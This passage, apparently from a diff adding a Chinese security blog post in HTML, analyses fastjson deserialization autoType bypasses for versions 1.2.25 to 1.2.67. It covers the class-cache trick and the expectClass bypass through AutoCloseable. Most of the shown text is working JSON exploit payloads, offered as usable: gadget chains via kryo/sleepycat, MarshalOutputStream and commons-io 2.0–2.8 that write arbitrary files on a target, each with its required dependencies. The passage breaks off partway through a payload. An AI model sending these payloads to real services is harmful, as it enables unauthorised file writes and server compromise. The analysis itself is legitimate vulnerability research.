+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211141552.png" /><br />
+跟进这个方法，这里也可以看到它会从val中拿到值，并赋值给objVal:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211142238.png" /></p>
+<p>后面又将objVal的值赋给strVal:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211142341.png" /><br />
+判断clazz的类型，这里是Class.class，最后会根据strVal里的值加载类:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211142606.png" /><br />
+同时我们可以看到使用<code>TypeUtils.loadClass()</code>时默认是将类缓存的，这样我们就将我们的恶意类放入了缓存。<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211142702.png" /><br />
+到第二个@type时，由于缓存已经存在这个恶意类，所以会直接返回，而不会走黑名单，所以我们的payload就能够绕过之前的安全机制。</p>
+<p>这里有一些注意事项，由于不同版本的<code>ParserConfig.checkAutoType()</code>解析存在差异，因此:<br />
+-   1.2.25-1.2.32：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发<br />
+-   1.2.33-1.2.47：无论是否开启AutoTypeSupport，都能成功利用</p>
+<p>这里存在的差异主要是由于在1.2.33-1.2.47中黑名单会判断类是否已经在缓存中，如果已经在缓存里则不会进行拦截:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211143108.png" /><br />
+而在旧版本中则不存在这个判断，因此在1.2.25-1.2.32时，如果开启了autotypesupport，则会直接被黑名单拦截。</p>
+<h4 id="1248-1267">1.2.48-1.2.67<a class="headerlink" href="#1248-1267" title="Permanent link">#</a></h4>
+<p>这版本的fastjson主要是继续添加黑名单，同时<code>TypeUtils.loadClass()</code>方法默认不启用缓存:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211143808.png" /></p>
+<p><img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211143818.png" /></p>
+<h5 id="1267-expectclass-bypass">&lt;=1.2.67 expectclass bypass<a class="headerlink" href="#1267-expectclass-bypass" title="Permanent link">#</a></h5>
+<p>上面的绕过方式都行不通了，我们还有什么方法可以加载恶意类吗？实际上在<code>TypeUtils.checkAutoType()</code>还存在着一个加载类的语句:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211151916.png" /><br />
+这里的条件<code>autotypesupport || jsonType || expectClassFlag</code>，这里autotypesupport不管开关都影响不大，因为我们没办法绕过前面的黑名单检测，我们重点关注<code>expectClassFlag</code>这个选项，其在这里被赋值:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211152313.png" /><br />
+这里需要满足以下几个条件<code>expectClassFlag</code>才为true:<br />
+1. expectClass存在<br />
+2. expectClass不在黑名单里</p>
+<p>我们可以看到expectClass是调用该函数时传入的，在整个fastjson中寻找checkAutoType的调用且expectClass不为空的，在<code>JavaBeanDeserializer.deserialize()</code>方法中找到我们的目标:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220211153326.png" /><br />
+这里的分析由于有点复杂，参考了其他师傅的文章，想要进入到这个位置，需要两个@type，第二个需要实现 AutoCloseable 接口，也就是最终payload类似于:<br />
+<div class="highlight"><pre><span></span><code><span class="mf">1.</span><span class="w">  </span><span class="err">`</span><span class="p">{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;com.example.json.evil.Evil&quot;</span><span class="p">,</span><span class="nt">&quot;cmd&quot;</span><span class="p">:</span><span class="s2">&quot;calc&quot;</span><span class="p">}</span><span class="err">`</span><span class="w"></span>
+</code></pre></div><br />
+这样我们就能够反序列化实现了AutoCloseable的类，利用这个绕过去实现攻击需要寻找到合适的实现了AutoCloseable的类并将他们组合起来，一些可用的payload如下:<br />
+第一个:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;stream&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;targetPath&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;./hacked.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">\\创建一个空文件</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;tempPath&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;./test.txt&quot;</span><span class="err">\\创建一个有内容的文件</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;writer&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;buffer&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;cHdu&quot;</span><span class="p">,</span><span class="w"> </span><span class="err">\\base</span><span class="mi">64</span><span class="err">后的文件内容</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;outputStream&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;$.stream&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;position&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;close&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;out&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;$.writer&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div><br />
+上述payload需要目标环境存在以下的依赖:<br />
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;dependency&gt;</span>
+  <span class="nt">&lt;groupId&gt;</span>com.sleepycat<span class="nt">&lt;/groupId&gt;</span>
+  <span class="nt">&lt;artifactId&gt;</span>je<span class="nt">&lt;/artifactId&gt;</span>
+  <span class="nt">&lt;version&gt;</span>5.0.73<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+
+<span class="nt">&lt;dependency&gt;</span>
+  <span class="nt">&lt;groupId&gt;</span>com.esotericsoftware<span class="nt">&lt;/groupId&gt;</span>
+  <span class="nt">&lt;artifactId&gt;</span>kryo<span class="nt">&lt;/artifactId&gt;</span>
+  <span class="nt">&lt;version&gt;</span>4.0.0<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+
+<span class="nt">&lt;dependency&gt;</span>
+  <span class="nt">&lt;groupId&gt;</span>org.aspectj<span class="nt">&lt;/groupId&gt;</span>
+  <span class="nt">&lt;artifactId&gt;</span>aspectjtools<span class="nt">&lt;/artifactId&gt;</span>
+  <span class="nt">&lt;version&gt;</span>1.9.5<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div></p>
+<p>第二个:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;out&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;out&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">           </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;java.io.FileOutputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">           </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/tmp/asdasd&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">           </span><span class="nt">&quot;append&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;infl&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">           </span><span class="nt">&quot;input&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">               </span><span class="nt">&quot;array&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">               </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">14</span><span class="w"></span>
+<span class="w">           </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;bufLen&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;100&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;protocolVersion&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div><br />
+上述的payload需要java保留了LocalVariableTable，参考其他师傅的原话:</p>
+<blockquote>
+<p>而我在多个不同的操作系统下的 OpenJDK、Oracle JDK 进行测试，目前只发现 CentOS 下的 OpenJDK 8 字节码调试信息中含有 LocalVariableTable（根据沈沉舟的文章，RedHat 下的 JDK8 安装包也会有，不过他并未说明是 OpenJDK 还是 Oracle JDK，我未做测试）。</p>
+</blockquote>
+<p>第三个(需要commons-io 2.x版本):<br />
+commons-io 2.0 - 2.6 版本:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;x&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;reader&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;charSequence&quot;</span><span class="p">:{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.String&quot;&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;charsetName&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;bufferSize&quot;</span><span class="p">:</span><span class="mi">1024</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;writer&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="s2">&quot;/tmp/pwned&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;encoding&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;append&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;charsetName&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;bufferSize&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1024</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;writeImmediately&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;trigger&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;is&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.input&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.branch&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;closeBranch&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;httpContentType&quot;</span><span class="p">:</span><span class="s2">&quot;text/xml&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;lenient&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;defaultEncoding&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;trigger2&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;is&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.input&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.branch&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;closeBranch&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;httpContentType&quot;</span><span class="p">:</span><span class="s2">&quot;text/xml&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;lenient&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;defaultEncoding&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;trigger3&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;is&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.input&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.branch&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;closeBranch&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;httpContentType&quot;</span><span class="p">:</span><span class="s2">&quot;text/xml&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;lenient&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;defaultEncoding&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div><br />
+commons-io 2.7 - 2.8.0 版本:<br />
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;x&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;reader&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;charSequence&quot;</span><span class="p">:{</span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.String&quot;&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;start&quot;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;end&quot;</span><span class="p">:</span><span class="mi">2147483647</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;charsetName&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;bufferSize&quot;</span><span class="p">:</span><span class="mi">1024</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;writer&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="s2">&quot;/tmp/pwned&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;charsetName&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;append&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;charsetName&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;bufferSize&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1024</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;writeImmediately&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;trigger&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;inputStream&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.input&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.branch&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;closeBranch&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;httpContentType&quot;</span><span class="p">:</span><span class="s2">&quot;text/xml&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;lenient&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;defaultEncoding&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;trigger2&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;inputStream&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;input&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.input&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;branch&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">          </span><span class="nt">&quot;$ref&quot;</span><span class="p">:</span><span class="s2">&quot;$.branch&quot;</span><span class="w"></span>
+<span class="w">        </span><span class="p">},</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;closeBranch&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"></span>
+<span class="w">      </span><span class="p">},</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;httpContentType&quot;</span><span class="p">:</span><span class="s2">&quot;text/xml&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;lenient&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;defaultEncoding&quot;</span><span class="p">:</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;trigger3&quot;</span><span class="p">:{</span><span class="w"></span>
+<span class="w">      </span><span class="nt">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"></span>
